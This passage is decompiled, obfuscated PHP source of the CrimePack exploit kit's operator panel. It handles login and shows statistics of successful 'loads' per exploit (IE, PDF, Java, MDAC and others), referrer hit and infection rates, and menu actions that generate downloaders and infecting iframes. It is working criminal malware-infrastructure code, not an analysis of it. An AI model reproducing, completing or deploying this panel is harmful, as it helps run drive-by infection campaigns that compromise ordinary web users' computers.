				$cgaggcbdeg = array( 'iepeers', 'msiemc', 'pdf', 'libtiff', 'mdac', 'java', 'webstart', 'OfficeViewer', 'Peachtree', 'Hummingbird', 'SymantecWorkspace', 'MSDDS', 'Snapshot', 'QuicktimeRTSP', 'WindowsMediaEncoder', 'Zenturi', 'ICQPhone', 'Facebookphoto', 'RealPlayerConsole', 'Yahoo', 'Zango', 'SuperBuddy', 'WKS', 'Sina', 'aggressive' );
				echo '<center>
               <table class="tbl2" width="800"><tr>
               <td class="tdtoptable" width="800" align="center"></b>advanced exploit stats</b></td></tr></table>
               <table class="tbl1" width="800">
               <tr>
               <td align="center" class="td1" width="200"><b>exploit</b></td>
               <td align="center" class="td1" width="100"><b>loads</b></td>
               </tr></center>';
				$ebjcjeejg = 0;
				$ddaeecdaee = array(  );
				foreach ($cgaggcbdeg as $fceibiegg) {
					$ddaeecdaee[$fceibiegg] = (isset( $dfjcieffbg['crimepack']['extra'][$fceibiegg] ) ? $dfjcieffbg['crimepack']['extra'][$fceibiegg] : 0);
				}

				arsort( $ddaeecdaee );
				foreach ($ddaeecdaee as $dfafcfbfff => $biieichfeg) {
					++$ebjcjeejg;
					$cbaddghhdf = ($ebjcjeejg % 2 == 0 ? '1' : '2');
					echo '
               <tr><td align="center" class="tdx' . $cbaddghhdf . '" width="300">' . strtolower( $dfafcfbfff ) . '</td>
               <td align="center" class="tdx' . $cbaddghhdf . '" width="70">' . $biieichfeg . '</td></tr>';
				}

				echo '
            </table>
            ';
				break;
			}

			case 'referrers': {
				if (0 < count( $dfjcieffbg['referrers'] )) {
					echo '<table class="tbl2" width="800"><tr>
               <td class="tdtoptable" width="800" align="center"></b>referrer</b></td></tr></table>
               <table class="tbl1" width="800">
               <tr>
               <td align="center" class="td1" width="200"><b>referrer</b></td>
               <td align="center" class="td1" width="100"><b>hits</b></td>
               <td align="center" class="td1" width="70"><b>loads</b></td>
               <td align="center" class="td1" width="70"><b>rate</b></td>
               </tr>';
					$ebjcjeejg = 0;
					foreach ($dfjcieffbg['referrers'] as $chagdggecb => $bcgijcjeci) {
						++$ebjcjeejg;
						$cbaddghhdf = ($ebjcjeejg % 2 == 0 ? '1' : '2');
						echo '<tr>
                  <td align="center" class="tdx' . $cbaddghhdf . '" width="300">' . $chagdggecb . '</td>
                  <td align="center" class="tdx' . $cbaddghhdf . '" width="70">' . $bcgijcjeci['hits'] . '</td>
                  <td align="center" class="tdx' . $cbaddghhdf . '" width="70">' . (isset( $bcgijcjeci['loads'] ) ? $bcgijcjeci['loads'] : 0) . '</td>
                  <td align="center" class="tdx' . $cbaddghhdf . '" width="70">' . (isset( $bcgijcjeci['loads'] ) ? GetRate( $bcgijcjeci['loads'], $bcgijcjeci['hits'] ) : 0) . '%</td>
                  </tr>';
					}


					while ($djibjdaeef = mysql_fetch_array( $jdcideceh )) {
					}

					echo '</table>';
					break;
				}
else {
					echo '<table class="tbl2" width="800"><tr>
               <td class="tdtoptable" width="800" align="center"><b>referrer</b></td></tr></table>
               <table class="tbl1" width="800">
               <tr>
               <td align="center" class="td1" width="200"><b>referrer</b></td>
               <td align="center" class="td1" width="100"><b>hits</b></td>
               <td align="center" class="td1" width="70"><b>loads</b></td>
               <td align="center" class="td1" width="70"><b>rate</b></td>
               </tr>
               <tr>
               <td align="center" class="tdx1" width="300">N/A</td>
               <td align="center" class="tdx1" width="70">N/A</td>
               <td align="center" class="tdx1" width="70">N/A</td>
               <td align="center" class="tdx1" width="70">N/A</td>
               </tr></table>';
				}
			}
		}

		echo '</td></tr></table><br />';

		if (( isset( $_GET['new'] ) && $bgjeghjabe->DataDecrypt( AUTOCHECK ) )) {
			echo '<center><table class="tbl2" width="100%" height="20"><tbody><tr>
      <td class="footer" align="center" width="100%" height="20">
   <script type="text/javascript" src="ajax.js"></script>
      <center>
      <script type="text/javascript" defer>
      function checkurl(){
         ajax_load(\'CP-ENC-5364.php?summary=1&URL=' . $bgjeghjabe->DataDecrypt( DOMAIN ) . '\', \'malwarecheck\',\'img/loading.gif\',\'Checking DNS Blacklist...\');
      }
      </script>
      <body onLoad="checkurl();">
      <div id=\'malwarecheck\'></div>
      </td></tr></tbody></table></center>';
		}

		echo '<br /><br /><!-- ID: ' . $degfbdhie . ' !! -->';
	}

	ob_start(  );
	session_start(  );

	if (!@include_once( 'config.inc.php' )) {
		exit( 'Error: configuration file does not exist!' );
	}
else {
		if (file_exists( 'install.php' )) {
			exit( 'Error: Remove install.php' );
		}
	}

	$sessionid = $_SERVER['REMOTE_ADDR'] . dirname( __FILE__ ) . 'CP';
	include( 'CP-ENC-7531.php' );
	$cpMySQL->ConnectMySQL(  );
	$pid = 'mawttaf';

	if (!isset( $_SESSION[$sessionid] )) {
		if (( isset( $_POST['login'] ) && isset( $_POST['password'] ) )) {
			$rets = mysql_query( 'SELECT * FROM `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'users` WHERE login = \'' . $cpMySQL->antisqli( (isset( $_POST['login'] ) ? $_POST['login'] : '') ) . '\'' );
			$row = mysql_fetch_row( $rets );
			$adm_password = $row[2];

			if (isset( $_POST['password'] )) {
				if (md5( $_POST['password'] ) == $adm_password) {
					$_SESSION['guest'] = ($row[0] == '2' ? true : false);
					$_SESSION[$sessionid] = true;
					header( 'Location: ' . $_SERVER['PHP_SELF'] . '?new=1' );
					exit(  );
				}
			}
		}
else {
			LoginPage(  );
		}
	}


	if (!isset( $_SESSION[$sessionid] )) {
		LoginPage(  );
	}


	if (isset( $_GET['page'] )) {
		$p = $_GET['page'];
		switch ($p) {
			case 'logout': {
				session_destroy(  );
				header( 'Location: ' . $_SERVER['PHP_SELF'] . '' );
				exit(  );
				break;
			}

			case 'clear': {
				if (!$_SESSION['guest']) {
					ClearStats(  );
				}

				exit(  );
				break;
			}

			case 'confirmed': {
				if (!$_SESSION['guest']) {
					$cpMySQL->ClearDB(  );
					header( 'Location: ' . $_SERVER['PHP_SELF'] . '' );
				}

				exit(  );
				break;
			}

			case 'main': {
				ShowStats( 'all' );
				break;
			}

			case 'advstats': {
				ShowStats( 'advstats' );
				break;
			}

			case 'countries': {
				ShowStats( 'countries' );
				break;
			}

			case 'referrers': {
				ShowStats( 'referrers' );
				break;
			}

			case 'checkurl': {
				CheckURL(  );
				break;
			}

			case 'makedownloader': {
				Downloader(  );
				break;
			}

			case 'makeiframe': {
				MakeIFrame(  );
				break;
			}

			case 'settings': {
				if (!$_SESSION['guest']) {
					ShowSettings(  );
				}

				break;
			}

			default: {
				ShowStats( 'all' );
				break;
			}
		}

		return 1;
	}

	ShowStats( 'all' );
?>
